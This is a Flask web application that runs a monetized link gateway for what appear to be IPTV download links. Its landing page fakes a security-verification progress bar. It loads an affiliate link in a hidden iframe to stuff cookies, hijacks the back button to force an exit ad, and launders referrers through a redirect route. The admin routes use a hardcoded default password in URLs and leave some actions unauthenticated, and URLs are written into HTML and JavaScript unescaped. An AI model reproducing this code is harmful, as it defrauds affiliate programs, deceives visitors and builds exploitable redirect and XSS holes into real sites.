
import os, re, json
from flask import Flask, render_template_string, request, redirect, url_for, Response
from pymongo import MongoClient
from bson.objectid import ObjectId

app = Flask(__name__)

# --- Database Setup ---
raw_uri = os.getenv("MONGO_URI", "").strip()
MONGO_URI = re.sub(r'[\s\n\r]', '', raw_uri)
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "mounir123")

client = MongoClient(MONGO_URI)
db = client['pro_gateway_db']
links_col = db['links']     # Store generated links
settings_col = db['settings'] # Store global monetization links

def get_settings():
    s = settings_col.find_one({"type": "global"})
    if not s:
        default = {"type": "global", "stuffing_url": "", "exit_url": ""}
        settings_col.insert_one(default)
        return default
    return s

# --- UI Templates ---

ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link Master Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style> body { font-family: 'Inter', sans-serif; } </style>
</head>
<body class="bg-slate-50 text-slate-800 p-4">
    <div class="max-w-2xl mx-auto">
        <header class="flex justify-between items-center mb-8 bg-white p-6 rounded-3xl shadow-sm border border-slate-100">
            <h1 class="text-xl font-extrabold text-blue-600">🚀 Master Control</h1>
            <span class="text-xs font-bold bg-green-100 text-green-600 px-3 py-1 rounded-full">System Active</span>
        </header>

        <!-- Global Monetization Settings -->
        <div class="bg-white p-6 rounded-3xl shadow-sm border border-slate-100 mb-6">
            <h2 class="text-sm font-bold text-slate-400 uppercase tracking-wider mb-4">Global Monetization</h2>
            <form action="/admin/update_settings" method="POST" class="space-y-4">
                <input name="stuffing_url" value="{{ s.stuffing_url }}" placeholder="AliExpress Affiliate Link" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-sm">
                <input name="exit_url" value="{{ s.exit_url }}" placeholder="Exit Ad Link (Adsterra/Tonic)" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-sm">
                <button class="w-full bg-slate-900 text-white py-4 rounded-2xl font-bold hover:bg-black transition">Update Global Settings</button>
            </form>
        </div>

        <!-- Create New Link -->
        <div class="bg-white p-6 rounded-3xl shadow-sm border border-slate-100 mb-8">
            <h2 class="text-sm font-bold text-slate-400 uppercase tracking-wider mb-4">Generate New Secure Link</h2>
            <form action="/admin/create_link" method="POST" class="space-y-4">
                <input name="title" placeholder="App Name (e.g. IPTV Pro)" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-sm" required>
                <input name="target_url" placeholder="Direct Download/M3U Link" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-sm" required>
                <button class="w-full bg-blue-600 text-white py-4 rounded-2xl font-bold hover:bg-blue-700 shadow-lg shadow-blue-200 transition">Create & Copy Link</button>
            </form>
        </div>

        <!-- Manage Existing Links -->
        <div class="space-y-4">
            <h2 class="text-sm font-bold text-slate-400 uppercase tracking-wider px-2">Active Links</h2>
            {% for link in links %}
            <div class="bg-white p-5 rounded-3xl shadow-sm border border-slate-100 flex flex-col gap-4">
                <div class="flex justify-between items-start">
                    <div>
                        <h3 class="font-bold text-slate-800">{{ link.title }}</h3>
                        <p class="text-[10px] text-blue-500 font-bold uppercase tracking-widest mt-1">Clicks: {{ link.clicks }}</p>
                    </div>
                    <a href="/admin/delete/{{ link._id }}" class="text-red-400 text-xs hover:text-red-600">Delete</a>
                </div>
                <div class="flex items-center gap-2">
                    <input id="url_{{ link._id }}" value="{{ host_url }}s/{{ link.slug }}" class="flex-1 p-3 bg-slate-50 border border-slate-100 rounded-xl text-[10px] font-mono outline-none" readonly>
                    <button onclick="copyLink('url_{{ link._id }}')" class="bg-blue-50 text-blue-600 px-4 py-3 rounded-xl text-xs font-bold hover:bg-blue-100 transition">Copy</button>
                </div>
            </div>
            {% endfor %}
        </div>
    </div>

    <script>
        function copyLink(id) {
            var copyText = document.getElementById(id);
            copyText.select();
            document.execCommand("copy");
            alert("Link Copied to Clipboard!");
        }
    </script>
</body>
</html>
"""

LANDING_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Link Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
    <style> body { font-family: 'Inter', sans-serif; } </style>
</head>
<body class="bg-slate-50 min-h-screen flex items-center justify-center p-4">
    <div class="max-w-md w-full bg-white rounded-[2.5rem] p-8 shadow-xl shadow-blue-100/50 border border-blue-50 text-center">
        <div class="w-20 h-20 bg-blue-50 text-blue-500 rounded-full flex items-center justify-center mx-auto mb-6 text-3xl">🛡️</div>
        <h1 class="text-2xl font-bold text-slate-900 mb-2">Secure Gateway</h1>
        <p class="text-slate-400 text-sm mb-10">Verification in progress... Your requested resource is being prepared.</p>

        <div id="loader">
            <div class="w-full bg-slate-100 h-2 rounded-full mb-4 overflow-hidden">
                <div id="bar" class="h-full bg-blue-500 transition-all duration-700 ease-out" style="width:0%"></div>
            </div>
            <p id="status" class="text-[10px] font-bold text-blue-400 uppercase tracking-widest animate-pulse">Initializing Security...</p>
        </div>

        <div id="ready" class="hidden">
            <div class="bg-emerald-50 text-emerald-600 p-4 rounded-2xl mb-6 text-xs font-bold uppercase tracking-widest">Verification Successful!</div>
            <a href="/redirect?url={{ target_url|urlencode }}" class="block w-full bg-blue-600 hover:bg-blue-700 text-white py-5 rounded-2xl font-bold shadow-lg shadow-blue-200 transition-all active:scale-95">Access Link Now</a>
        </div>
    </div>

    {% if s.stuffing_url %}<iframe src="/redirect?url={{ s.stuffing_url|urlencode }}" style="display:none;width:0;height:0;"></iframe>{% endif %}

    <script>
        let p=0; const b=document.getElementById('bar'), st=document.getElementById('status'), l=document.getElementById('loader'), r=document.getElementById('ready');
        const msgs = ["Securing Tunnel...", "Checking IP...", "Cleaning Source...", "Finalizing..."];
        const iv = setInterval(() => {
            p+=10; b.style.width=p+"%";
            if(p%20==0) st.innerText = msgs[Math.floor(p/26)];
            if(p>=100){ clearInterval(iv); l.classList.add('hidden'); r.classList.remove('hidden'); }
        }, 300);

        (function() {
            const ex = "{{ s.exit_url }}"; if(!ex) return;
            history.pushState(null, null, location.href);
            window.onpopstate = function() { location.href = "/redirect?url=" + encodeURIComponent(ex); };
        })();
    </script>
</body>
</html>
"""

# --- Routes Logic ---

@app.route('/')
def home(): return "Gateway Active."

@app.route('/s/<slug>')
def gateway(slug):
    link = links_col.find_one({"slug": slug})
    if not link: return "Link Expired or Invalid.", 404
    links_col.update_one({"slug": slug}, {"$inc": {"clicks": 1}})
    return render_template_string(LANDING_HTML, target_url=link['target_url'], s=get_settings())

@app.route('/redirect')
def laundry():
    url = request.args.get('url')
    if not url: return redirect('/')
    return f'<html><head><meta name="referrer" content="no-referrer"><meta http-equiv="refresh" content="0;url={url}"></head><body></body></html>'

@app.route('/admin')
def admin():
    if request.args.get('pw') != ADMIN_PASSWORD: return "Denied", 403
    links = list(links_col.find().sort("_id", -1))
    return render_template_string(ADMIN_HTML, links=links, s=get_settings(), host_url=request.host_url, pw=ADMIN_PASSWORD)

@app.route('/admin/create_link', methods=['POST'])
def create_link():
    title = request.form['title']
    target = request.form['target_url']
    slug = re.sub(r'[^a-z0-9]', '-', title.lower()).strip('-') + "-" + os.urandom(2).hex()
    links_col.insert_one({"title": title, "target_url": target, "slug": slug, "clicks": 0})
    return redirect(f"/admin?pw={ADMIN_PASSWORD}")

@app.route('/admin/update_settings', methods=['POST'])
def update_settings():
    settings_col.update_one({"type": "global"}, {"$set": {
        "stuffing_url": request.form['stuffing_url'],
        "exit_url": request.form['exit_url']
    }})
    return redirect(f"/admin?pw={ADMIN_PASSWORD}")

@app.route('/admin/delete/<id>')
def delete_link(id):
    links_col.delete_one({"_id": ObjectId(id)})
    return redirect(f"/admin?pw={ADMIN_PASSWORD}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
